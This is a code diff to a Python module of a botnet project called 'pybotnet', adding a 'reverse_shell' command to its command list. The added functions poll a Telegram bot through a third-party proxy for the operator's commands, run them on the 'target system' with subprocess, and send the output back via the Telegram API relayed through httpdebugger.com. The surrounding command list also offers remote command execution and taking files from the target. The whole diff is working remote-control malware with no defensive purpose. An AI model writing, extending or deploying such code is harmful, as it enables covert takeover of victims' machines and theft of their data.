@@ -2,8 +2,9 @@
 import re
 import os
 import subprocess
+import requests
 
-from logging import exception
+from logging import Logger, exception
 from time import sleep
 
 from uuid import getnode as get_system_mac_addres
@@ -12,7 +13,7 @@ from requests import get
 # pybotnet import
 from . import util
 from . import settings
-
+import configs
 
 MAC_ADDRES = str(get_system_mac_addres())
 
@@ -27,10 +28,6 @@ scripts_name = {
 
     "cmd": "`cmd <command>`: run command in target terminal",
 
-    "ls": "`ls <route>`: Return a list of folders and files in that path",
-
-    "cd": "`cd <route>`: change directory",
-
     "export_file": "`export_file <download link>`: target donwload this file and save to script path",
 
     "import_file": "`import_file <file route>`: get a file from target system",
@@ -39,7 +36,9 @@ scripts_name = {
 
     "help": "`help`: send this message",
 
-    "/start": "`/start`: run `help` command!"
+    "/start": "`/start`: run `help` command!",
+
+    "reverse_shell" : "start reverse shell on target system"
 }
 
 
@@ -59,6 +58,87 @@ def is_command(command) -> bool:
         return True
     return False
 
+## reverse shell codes
+def send_message(text: str):
+    ''' get a text and send message in bot'''
+
+    sender_link = f"https://api.telegram.org/bot{configs.TELEGRAM_TOKEN}/SendMessage?chat_id={configs.ADMIN_CHAT_ID}&text={text}"
+    payload = {"UrlBox": sender_link,
+               "AgentList": "Mozilla Firefox",
+               "VersionsList": "HTTP/1.1",
+               "MethodList": "POST"
+               }
+    response = requests.post(
+            url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
+            data=payload,
+            timeout=4)
+    
+    return response
+
+
+def get_last_message(logger):
+    ''' get last bot message '''
+
+    text = util.get_update_by_third_party_proxy(TELEGRAM_TOKEN=configs.TELEGRAM_TOKEN,logger=logger)
+    return text
+
+
+
+last_admin_command = []
+def get_last_command(logger):
+    ''' extract command from  get_last_message function'''
+
+    message = get_last_message(logger=logger)
+    message = message[-1]
+    last_message = message['message']['text']
+    last_admin_command.append(last_message)
+    return last_message
+
+def reverse_shell(logger):
+    ''' start reverse shell on target system and send response in telegram bot '''
+
+    logger.info("start reverse shell")
+
+    # get last command to prevent duplication
+    message_one = get_last_command(logger)
+    
+
+    repeat = 0
+
+    while 1:
+        pwd = f"{os.getcwd()}=>"
+        message = util.get_update_by_third_party_proxy(TELEGRAM_TOKEN=configs.TELEGRAM_TOKEN,logger=logger)
+        message = message[-1]
+        message_two = message['message']['text']
+        
+        if message_one == message_two:
+            if repeat == 0:
+                send_message(f"{os.getcwd()}=>")
+            sleep(2)
+            repeat += 1
+            continue
+        else:
+            message_one = get_last_command(logger)
+            if message_one == "exit":
+                out_put = "reverse shell exit."
+                send_message(out_put)
+                break
+            else:
+                ## set cd command 
+                if message_one.split(" ")[0] == 'cd':
+                    os.chdir(message_one.split(" ")[1])
+                    out_put = f"{os.getcwd()}=>"
+    
+                ## if command not a cd run that on system
+                if message_one.split(" ")[0] != "cd":
+                    out_put = subprocess.getoutput(message_two)
+        
+            #send Output commands
+            send_message(out_put)
+            repeat = 0
+
+###################
+###################
 
 def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
     command_name = get_command_name(command)
@@ -97,6 +177,9 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name in ['help', '/start']:
                 return command_help(logger)
+            
+            elif command_name in ['reverse_shell']:
+                return reverse_shell(logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
